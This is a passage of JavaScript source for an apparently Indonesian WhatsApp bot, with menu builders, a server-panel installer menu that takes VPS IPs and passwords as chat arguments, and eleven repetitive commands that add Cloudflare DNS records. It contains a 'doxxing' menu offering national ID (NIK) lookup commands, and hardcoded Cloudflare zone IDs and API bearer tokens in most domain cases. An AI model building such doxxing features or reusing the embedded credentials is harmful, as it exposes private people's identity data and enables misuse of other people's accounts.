"buttonParamsJson": JSON.stringify(listMessage)
 },
 ]
 })
 })
 }
 }
}, {})

await rafatharcode.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}


break 

case 'doxxing': case 'dox': {
let teksmenu = `
Silahkan Pilih Fitur Doxxing`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksmenu
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": `{ "title": "List Fitur Doxxing", "sections": [{ "title": "# Silahkan Pilih Salah Satu Di Bawah Ini", "highlight_label": \"Powered By ${ownername}\", "rows": [{ "header": "Fitur Nikparser", "title": "Nikparser Simpel", "id": ".nikparser" }, 
{ "header": "Fitur Getnik", "title": "Getnik Simpel", "id": ".getnik" }]}]}`
}, {
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Kontak Owner\",\"title\":\"Kontak Owner Kami\",\"id\":\".owner\"}" 
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
await rafatharcode.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break

case 'rinstallermenuv1': {
if (!isOwner && !isResinstall) return onlyOwn()
let teksnya = `Berikut List Instal Panel Menu`
let sections = [{
title: '# LIST INSTALL MENU',
highlight_label: 'Powered By RiiSTORE ID',
rows: [{
title: 'UBUNTU 20.04',
description: `UBUNTU VERSI 20.04`, 
id: '.installpanel1'
},
{
title: 'UBUNTU 22.04',
description: `UBUNTU VERSI 22.04`, 
id: '.installpanel2'
},
{
title: 'UBUNTU 24.04',
description: `UBUNTU VERSI 24.04`, 
id: '.installpanel3'
},
{
title: 'DEBIAN 11',
description: `DEBIAN VERSI 11`, 
id: '.installpanel4'
},
{
title: 'DEBIAN 12',
description: `DEBIAN VERSI 12`, 
id: '.installpanel5'
},
{
title: 'STARTWINGS',
description: `STARTWINGS`, 
id: '.startwings'
}]
     }]
let listMessage = {
    title: 'List Install Menu', 
    sections
};

let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: `${footer2}`
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./lib/thumbnail/thumbnail.jpg")}, { upload: rafatharcode.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"Owner\",\"url\":\"https://wa.me/6283161246809\",\"merchant_url\":\"https://wa.me/6283161246809\"}"
}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await rafatharcode.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break

case 'rinstallermenuv2': {
if (!isOwner && !isResinstall) return onlyOwn()
let t = text.split(',');
if (t.length < 5) return reply(`*Format salah!*
Penggunaan:
${prefix + command} ipvps,password,domainpnl,domainnode,ramvps (Contoh 80000 8gb)`)
    let ipvps = t[0];
    let passwd = t[1];
    let subdomain = t[2];
    let domainnode = t[3];
    let ramvps = t[4];

let sections = [{
title: 'List install otomatis di bawah',
rows: [{
title: 'UBUNTU 20.04',
description: `INSTALL PANEL UBUNTU VERSI 20.04`, 
id: `.installpanel1 ${ipvps},${passwd},${subdomain},${domainnode},${ramvps}`
},
{
title: 'UBUNTU 22.04',
description: `INSTALL PANEL UBUNTU VERSI 22.04`, 
id: `.installpanel2 ${ipvps},${passwd},${subdomain},${domainnode},${ramvps}`
},
{
title: 'UBUNTU 24.04',
description: `INSTALL PANEL UBUNTU VERSI 24.04`, 
id: `.installpanel3 ${ipvps},${passwd},${subdomain},${domainnode},${ramvps}`
},
{
title: 'DEBIAN 11',
description: `INSTALL PANEL DEBIAN VERSI 11`, 
id: `.installpanel4 ${ipvps},${passwd},${subdomain},${domainnode},${ramvps}`
},
{
title: 'DEBIAN 12',
description: `INSTALL PANEL DEBIAN VERSI 12`, 
id: `.installpanel5 ${ipvps},${passwd},${subdomain},${domainnode},${ramvps}`
}]
}]

let listMessage = {
    title: 'Klik Disini!', 
    sections
};

let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: '120363267533195844@newsletter',
 newsletterName: 'Powered By RiiSTORE ID', 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: rafatharcode.decodeJid(rafatharcode.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: Styles(`Please choose the you install`)
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: `${footer2}`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: `*Hi @${m.sender.split("@")[0]} 👋*`,
 subtitle: "dcdXdino",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/b16b6163e621449bdcecb.jpg" } }, { upload: rafatharcode.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
 "name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage)
 },
 ]
 })
 })
 }
 }
}, {})

await rafatharcode.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}


break 

case 'rinstallermenuv3': {
if (!isOwner && !isResinstall) return onlyOwn()
let t = text.split(',');
if (t.length < 5) return reply(`*Format salah!*
Penggunaan:
${prefix + command} ipvps,password,domainpnl,domainnode,ramvps (Contoh 80000 8gb)`)
    let ipvps = t[0];
    let passwd = t[1];
    let subdomain = t[2];
    let domainnode = t[3];
    let ramvps = t[4];

let sections = [{
title: 'List install otomatis di bawah',
rows: [{
title: 'UBUNTU 20.04',
description: `INSTALL PANEL UBUNTU VERSI 20.04`, 
id: `.installpanel1-v2 ${ipvps},${passwd},${subdomain},${domainnode},${ramvps}`
},
{
title: 'UBUNTU 22.04',
description: `INSTALL PANEL UBUNTU VERSI 22.04`, 
id: `.installpanel2-v2 ${ipvps},${passwd},${subdomain},${domainnode},${ramvps}`
},
{
title: 'UBUNTU 24.04',
description: `INSTALL PANEL UBUNTU VERSI 24.04`, 
id: `.installpanel3-v2 ${ipvps},${passwd},${subdomain},${domainnode},${ramvps}`
},
{
title: 'DEBIAN 11',
description: `INSTALL PANEL DEBIAN VERSI 11`, 
id: `.installpanel4-v2 ${ipvps},${passwd},${subdomain},${domainnode},${ramvps}`
},
{
title: 'DEBIAN 12',
description: `INSTALL PANEL DEBIAN VERSI 12`, 
id: `.installpanel5-v2 ${ipvps},${passwd},${subdomain},${domainnode},${ramvps}`
}]
}]

let listMessage = {
    title: 'Klik Disini!', 
    sections
};

let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: '120363267533195844@newsletter',
 newsletterName: 'Powered By RiiSTORE ID', 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: rafatharcode.decodeJid(rafatharcode.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: Styles(`Please choose the you install`)
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: `${footer2}`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: `*Hi @${m.sender.split("@")[0]} 👋*`,
 subtitle: "dcdXdino",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/b16b6163e621449bdcecb.jpg" } }, { upload: rafatharcode.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
 "name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage)
 },
 ]
 })
 })
 }
 }
}, {})

await rafatharcode.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}


break 

case 'domain1': {
          if (!isOwner && !isJangan) return onlyOwn()
            function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "e13ba8568f6e44ca927569da961d9eb6";
               let apitoken = "bTF2B2fQNe0nJL62gTuGQEbeZCEbOC0FpGWB-ESr";
               let tld = "rafatharofficial.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RiiSTORE ID⚡_*\n\n*_Join group gua dong cik mau bagi"vps:_*\n*_https://chat.whatsapp.com/DlHuKL818SmHPwmWvh17NS_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
           
          break
case 'domain2': {
          if (!isOwner && !isJangan) return onlyOwn()
            function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "d4a6adffd3dd317753c4401e38cb7949";
               let apitoken = "oMSalNry5ByDu_PBJhTAxNOhQiYKjWQImKKDIhWh";
               let tld = "digital-market.me";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RiiSTORE ID⚡_*\n\n*_Join group gua dong cik mau bagi"vps:_*\n*_https://chat.whatsapp.com/DlHuKL818SmHPwmWvh17NS_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }                    
          break
          case 'domain3': {
          if (!isOwner && !isJangan) return onlyOwn()
            function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "0cf0d98bcb60af202ad5816f672ca471";
               let apitoken = "f5ApkZpsRdJxTuA0xlfr9vCJ1bknGAAJ7rv10H_f";
               let tld = "sellerpanell-store.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RiiSTORE ID⚡_*\n\n*_Join group gua dong cik mau bagi"vps:_*\n*_https://chat.whatsapp.com/DlHuKL818SmHPwmWvh17NS_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }                      
          break
          case 'domain4': {
          if (!isOwner && !isJangan) return onlyOwn()
            function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "95a92e2d61881587d97147504adae179";
               let apitoken = "Gh2ZG8DO7MoD7behXJc9NilacIdSv9o1BnMxiY-S";
               let tld = "mypanell-store.com";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RiiSTORE ID⚡_*\n\n*_Join group gua dong cik mau bagi"vps:_*\n*_https://chat.whatsapp.com/DlHuKL818SmHPwmWvh17NS_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
           
          break
          case 'domain5': {
          if (!isOwner && !isJangan) return onlyOwn()
            function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "e907dafdca23667a2b5736c14243546c";
               let apitoken = "Bp_SbjAyWSbhglC6YqyLAjUrbhc8Xzx7cYDOWA4R";
               let tld = "panelstoreku.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RiiSTORE ID⚡_*\n\n*_Join group gua dong cik mau bagi"vps:_*\n*_https://chat.whatsapp.com/DlHuKL818SmHPwmWvh17NS_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
           
          break
          case 'domain6': {
          if (!isOwner && !isJangan) return onlyOwn()
            function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "d2cfda818701061d6f6fb945656f15a0";
               let apitoken = "Bp_SbjAyWSbhglC6YqyLAjUrbhc8Xzx7cYDOWA4R";
               let tld = "panel-turzz.me";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RiiSTORE ID⚡_*\n\n*_Join group gua dong cik mau bagi"vps:_*\n*_https://chat.whatsapp.com/DlHuKL818SmHPwmWvh17NS_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
           
          break
          case 'domain7': {
          if (!isOwner && !isJangan) return onlyOwn()
            function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "754b80a855a0be5f8408362be027de47";
               let apitoken = "Bp_SbjAyWSbhglC6YqyLAjUrbhc8Xzx7cYDOWA4R";
               let tld = "panelanimeku.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RiiSTORE ID⚡_*\n\n*_Join group gua dong cik mau bagi"vps:_*\n*_https://chat.whatsapp.com/DlHuKL818SmHPwmWvh17NS_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
           
          break
          case 'domain8': {
          if (!isOwner && !isJangan) return onlyOwn()
            function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "0732cec5bce56eb1080ccde36e41a21e";
               let apitoken = "Bp_SbjAyWSbhglC6YqyLAjUrbhc8Xzx7cYDOWA4R";
               let tld = "turzcloud.tech";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RiiSTORE ID⚡_*\n\n*_Join group gua dong cik mau bagi"vps:_*\n*_https://chat.whatsapp.com/DlHuKL818SmHPwmWvh17NS_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
           
          break
          case 'domain9': {
          if (!isOwner && !isJangan) return onlyOwn()
            function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "f267a35df1d1b1de6ad8d64a0b7b4fde";
               let apitoken = "Bp_SbjAyWSbhglC6YqyLAjUrbhc8Xzx7cYDOWA4R";
               let tld = "cloudxingyu.me";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RiiSTORE ID⚡_*\n\n*_Join group gua dong cik mau bagi"vps:_*\n*_https://chat.whatsapp.com/DlHuKL818SmHPwmWvh17NS_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
           
          break
          case 'domain10': {
          if (!isOwner && !isJangan) return onlyOwn()
            function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "fb14e64f34403687018df4c6281b5055";
               let apitoken = "Bp_SbjAyWSbhglC6YqyLAjUrbhc8Xzx7cYDOWA4R";
               let tld = "xinyustore.tech";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RiiSTORE ID⚡_*\n\n*_Join group gua dong cik mau bagi"vps:_*\n*_https://chat.whatsapp.com/DlHuKL818SmHPwmWvh17NS_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
           
          break
          case 'domain11': {
          if (!isOwner && !isJangan) return onlyOwn()
            function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "a33497f2438c716b86d470f0dbd3c0ca";
               let apitoken = "Bp_SbjAyWSbhglC6YqyLAjUrbhc8Xzx7cYDOWA4R";
               let tld = "panel-store.games";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
